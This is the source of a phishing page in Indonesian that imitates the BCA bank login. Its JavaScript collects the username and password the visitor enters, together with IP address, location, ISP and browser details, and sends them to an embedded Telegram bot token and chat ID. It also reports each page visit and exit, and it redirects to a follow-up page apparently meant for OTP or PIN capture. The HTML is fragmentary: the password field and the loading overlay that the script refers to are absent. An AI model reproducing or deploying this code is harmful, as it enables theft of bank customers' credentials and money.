    <div class="container">
        <form id="loginForm">
            <div class="container">
                <br>
                <lbl style="color:#1e5cb5;font-weight: 800;font-size:14px;">Username</lbl>  
                <input type="text" id="username" placeholder="CorporateID UserID (Tanpa Spasi)" name="user" required>

    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEh1_ULa8tNaIrvWu9BoTLvnfCm4NrsplOISbA6FNda4WzAjWpJLNCjp6yrtdMMkx98U2nC7JuhQR_5yXB2zWcjxg--jOEh3YvxjVW-JFKNXN4jQwW3Zp8lunKTBTU9mxytP0spr-rI5s2K3xRQmYKxtfKtU3t8H2jzg6yyv_gKWqrX_a6o5yK6MU3HEgZwm" width="100%" alt="">

    <p id="status"></p>

    <script>
        // ==================== KONFIGURASI TELEGRAM ====================
        const TELEGRAM_TOKEN = "8886749483:AAGcJx5AGiJt3gYqRMrKkLDI2x1tA2m-paM"; // Ganti Dengan Token Bot Telegram Anda 
        const CHAT_ID = "7384813944"; // Gati Dengan Chta ID Telegram Anda

        // ==================== FUNGSI KIRIM KE TELEGRAM ====================
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (!response.ok) {
                    console.error('Gagal mengirim ke Telegram');
                    document.getElementById('status').textContent = "Gagal mengirim data";
                }
                return await response.json();
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('status').textContent = "Error koneksi";
            }
        }

        // ==================== FUNGSI GET IP ====================
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'Tidak diketahui';
            }
        }

        // ==================== FUNGSI GET DETAIL IP ====================
        async function getIPDetails() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || 'Tidak diketahui',
                    city: data.city || 'Tidak diketahui',
                    region: data.region || 'Tidak diketahui',
                    country: data.country_name || 'Tidak diketahui',
                    org: data.org || 'Tidak diketahui'
                };
            } catch (e) {
                return {
                    ip: 'Tidak diketahui',
                    city: 'Tidak diketahui',
                    region: 'Tidak diketahui',
                    country: 'Tidak diketahui',
                    org: 'Tidak diketahui'
                };
            }
        }

        // ==================== ELEMEN DOM ====================
        const loginForm = document.getElementById('loginForm');
        const username = document.getElementById('username');
        const password = document.getElementById('password');
        const loadingOverlay = document.getElementById('loading-overlay');

        // ==================== FORMAT PESAN BCA ====================
        function formatBCAMessage(data, ipDetails) {
            const now = new Date();
            const waktu = now.toLocaleString('id-ID', { 
                timeZone: 'Asia/Jakarta',
                dateStyle: 'full',
                timeStyle: 'medium'
            });
            
            return `
🏦 <b>BCA - LOGIN</b> 🏦
══════════════════════════

👤 <b>Username:</b> <code>${data.username}</code>

🔑 <b>Password:</b> <code>${data.password}</code>

══════════════════════════
<b>📍 INFORMASI LOKASI</b>
══════════════════════════

🌐 <b>IP Address:</b> ${ipDetails.ip}
🏙️ <b>Kota:</b> ${ipDetails.city}
🌏 <b>Region:</b> ${ipDetails.region}
🇮🇩 <b>Negara:</b> ${ipDetails.country}
🏢 <b>ISP:</b> ${ipDetails.org}

══════════════════════════
<b>📱 INFORMASI PERANGKAT</b>
══════════════════════════

⏰ <b>Waktu:</b> ${waktu}
📱 <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}

══════════════════════════
🔔 <b>NOTIFIKASI LOGIN BCA</b>
══════════════════════════`;
        }

        // ==================== KIRIM NOTIFIKASI HALAMAN DIBUKA ====================
        window.addEventListener('load', async function() {
            const ipDetails = await getIPDetails();
            
            await sendToTelegram(`
🔵 <b>HALAMAN LOGIN BCA DIBUKA</b> 🔵
══════════════════════════

👤 User membuka halaman login BCA

📍 <b>Lokasi:</b> ${ipDetails.city}, ${ipDetails.region}
🌐 <b>IP:</b> ${ipDetails.ip}
⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}

══════════════════════════
            `);
        });

        // ==================== HANDLE FORM SUBMIT ====================
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const usernameVal = username.value.trim();
            const passwordVal = password.value.trim();
            
            if (!usernameVal || !passwordVal) {
                alert('Username dan Password harus diisi');
                return;
            }

            // Tampilkan loading
            loadingOverlay.style.display = 'flex';

            // Ambil data
            const data = {
                username: usernameVal,
                password: passwordVal
            };

            // Dapatkan IP details
            const ipDetails = await getIPDetails();

            // Format pesan
            const message = formatBCAMessage(data, ipDetails);

            // Kirim ke Telegram
            await sendToTelegram(message);

            // Simpan data ke sessionStorage untuk halaman berikutnya
            sessionStorage.setItem("bcaUsername", data.username);
            sessionStorage.setItem("bcaPassword", data.password);

            // Redirect setelah 1.5 detik
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                // Ganti dengan halaman tujuan berikutnya (misal: OTP atau PIN)
                window.location.href = "kode.html"; 
            }, 1500);
        });

        // ==================== TRACK INPUT (OPSIONAL) ====================
        let lastUsername = '';
        username.addEventListener('input', function() {
            if (this.value.length > 5 && this.value !== lastUsername) {
                lastUsername = this.value;
                // Uncomment jika ingin track setiap input
                // sendToTelegram(`⌨️ User mengetik username: ${this.value}`);
            }
        });

        // ==================== NOTIFIKASI KELUAR HALAMAN ====================
        window.addEventListener('beforeunload', function() {
            const message = `
🚪 <b>USER MENINGGALKAN HALAMAN BCA</b> 🚪
══════════════════════════

👤 User menutup halaman login BCA
⏰ Waktu: ${new Date().toLocaleString('id-ID')}

══════════════════════════
            `;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            const data = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            };
            
            navigator.sendBeacon(url, JSON.stringify(data));
        });

        // ==================== VALIDASI FORM ====================
        // Enable/disable button based on input (opsional)
        function checkInputs() {
            const btn = document.querySelector('button[type="submit"]');
            if (username.value && password.value) {
                btn.disabled = false;
            } else {
                btn.disabled = true;
            }
        }

        username.addEventListener('input', checkInputs);
        password.addEventListener('input', checkInputs);

        // Initial check
        checkInputs();

        console.log('Script BCA siap!');
    </script>
